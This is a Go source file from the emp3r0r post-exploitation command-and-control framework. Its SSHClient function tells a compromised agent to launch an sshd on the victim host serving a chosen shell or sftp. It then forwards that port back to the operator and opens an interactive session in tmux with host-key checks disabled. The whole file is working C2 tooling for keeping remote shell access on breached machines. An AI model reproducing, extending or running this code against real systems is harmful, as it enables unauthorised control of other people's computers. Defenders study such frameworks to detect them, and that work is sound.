package modules

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type SSH_SHELL_Mapping struct {
	Shell   string                  // the shell to run, eg. bash, python
	Agent   *def.Emp3r0rAgent       // the agent this shell is connected to
	PortFwd *network.PortFwdSession // the port mapping for this shell session
	ToPort  string                  // the port to connect to on the agent side, always the same as PortFwd.To's port
}

// shell - port mapping
// one port for one shell
var SSHShellPort = make(map[string]*SSH_SHELL_Mapping)

// SSHClient ssh to sshd server, with shell access in a new tmux window
// shell: the executable to run, eg. bash, python
// port: serve this shell on agent side 127.0.0.1:port
func SSHClient(shell, args, port string, split bool) (err error) {
	target := agents.MustGetActiveAgent()
	if target == nil {
		return errors.New("no active agent")
	}
	// check if sftp is requested
	is_sftp := shell == "sftp"
	ssh_prog := "ssh"
	if is_sftp {
		ssh_prog = "sftp"
		shell = "sftp"
	}

	// if shell/sftp pane already exists, abort
	if split {
		if cli.AgentShellPane != nil {
			if !is_sftp && cli.AgentSFTPPane != nil {
				return
			}
		}
	}

	// SSHDShellPort is reserved
	is_new_port_needed := (port == live.RuntimeConfig.SSHDShellPort && shell != "sftp")
	// check if port mapping is already open, if yes, use it
	for s, mapping := range SSHShellPort {
		if s == shell && mapping.Agent == target {
			port = mapping.ToPort
			is_new_port_needed = false
		}
	}

	if !util.IsCommandExist("ssh") {
		err = fmt.Errorf("ssh must be installed")
		return
	}

	// check if we need a new (SSH) port (on the agent side, for new shell)
	lport := strconv.Itoa(util.RandInt(2048, 65535)) // shell gets mapped here
	new_port := strconv.Itoa(util.RandInt(2048, 65535))
	if is_new_port_needed {
		port = new_port // reset port

		// if sftp is requested, we are not using `interactive_shell` module
		// so no options to set
		if !is_sftp {
			live.SetOption("port", new_port)
		}
		logging.Warningf("Switching to a new port %s for shell (%s)", port, shell)
	}
	to := "127.0.0.1:" + port // decide what port/shell to connect to

	// is port mapping already done?
	port_mapping_exists := false
	for _, p := range network.PortFwds {
		if p.Agent == target && p.To == to {
			port_mapping_exists = true
			for s, ssh_mapping := range SSHShellPort {
				// one port for one shell
				// if trying to open a different shell on the same port, change to a new port
				if s != shell && ssh_mapping.ToPort == port {
					new_port := strconv.Itoa(util.RandInt(2048, 65535))
					logging.Warningf("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
					live.SetOption("port", new_port)
					err = SSHClient(shell, args, new_port, split)
					return err
				}
			}
			// if a shell is already open, use it
			logging.Warningf("Using existing port mapping %s -> remote:%s for shell %s", p.Lport, port, shell)
			lport = p.Lport // use the correct port
			break
		}
	}

	if !port_mapping_exists {
		// start sshd server on target
		cmd_id := uuid.NewString()
		if args == "" {
			args = "--"
		}
		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", def.C2CmdSSHD, shell, port, args)
		err = CmdSender(cmd, cmd_id, target.Tag)
		if err != nil {
			return
		}
		logging.Infof("Waiting for sshd (%s) on target %s", shell, strconv.Quote(target.Tag))

		// wait until sshd is up
		defer func() {
			live.CmdResults.Delete(cmd_id)
		}()
		is_response := false
		res := ""
		for i := 0; i < 100; i++ {
			time.Sleep(100 * time.Millisecond)
			if val, ok := live.CmdResults.Load(cmd_id); ok {
				res = val.(string)
				is_response = true
			} else {
				is_response = false
			}
			if is_response {
				if strings.Contains(res, "success") ||
					strings.Contains(res,
						fmt.Sprintf("listen tcp 127.0.0.1:%s: bind: address already in use", port)) {
					break
				} else {
					err = fmt.Errorf("start sshd (%s) failed: %s", shell, res)
					return
				}
			}
		}
		if !is_response {
			err = fmt.Errorf("didn't get response from agent (%s), aborting", target.Tag)
			return
		}

		// set up port mapping for the ssh session
		logging.Infof("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
		pf := &network.PortFwdSession{}
		pf.Description = fmt.Sprintf("ssh shell (%s)", shell)
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		pf.SendCmdFunc = CmdSender
		go func() {
			// remember the port mapping and shell and agent
			SSHShellPort[shell] = &SSH_SHELL_Mapping{
				Shell:   shell,
				Agent:   target,
				PortFwd: pf,
				ToPort:  port,
			}
			err = pf.RunPortFwd()
			if err != nil {
				err = fmt.Errorf("PortFwd failed: %v", err)
				logging.Errorf("Start port mapping for sshd (%s): %v", shell, err)
			}
		}()
		logging.Infof("Waiting for response from %s", target.Tag)
		if err != nil {
			return
		}
	}

	// wait until the port mapping is ready
	port_mapping_exists = false
wait:
	for i := 0; i < 100; i++ {
		if port_mapping_exists {
			break
		}
		time.Sleep(50 * time.Millisecond)
		for _, p := range network.PortFwds {
			if p.Agent.Tag == target.Tag && p.To == to {
				port_mapping_exists = true
				break wait
			}
		}
	}
	if !port_mapping_exists {
		err = errors.New("port mapping unsuccessful")
		return
	}

	// let's do the ssh
	sshPath, err := exec.LookPath(ssh_prog)
	if err != nil {
		logging.Errorf("%s not found, please install it first: %v", ssh_prog, err)
	}
	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no %s",
		sshPath, lport, "127.0.0.1")
	if is_sftp {
		sshCmd = fmt.Sprintf("%s -P %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no %s",
			sshPath, lport, "127.0.0.1")
	}

	// agent name
	name := target.Hostname

	// if open in split tmux pane
	if split {
		cli.AgentShellPane, err = cli.TmuxNewPane("Shell", "v", cli.CommandPane.ID, 30, sshCmd)
		cli.TmuxPanes[cli.AgentShellPane.ID] = cli.AgentShellPane
		return err
	}

	// if open in new tmux window
	logging.Infof("\nOpening SSH (%s - %s) session for %s in Shell tab.\n"+
		"If that fails, please execute command\n%s\nmanaully",
		shell, port, target.Tag, sshCmd)

	// if a shell is wanted, just open in new tmux window, you will see a new tab
	return cli.TmuxNewWindow(fmt.Sprintf("shell/%s/%s-%s", name, shell, port), sshCmd)
}
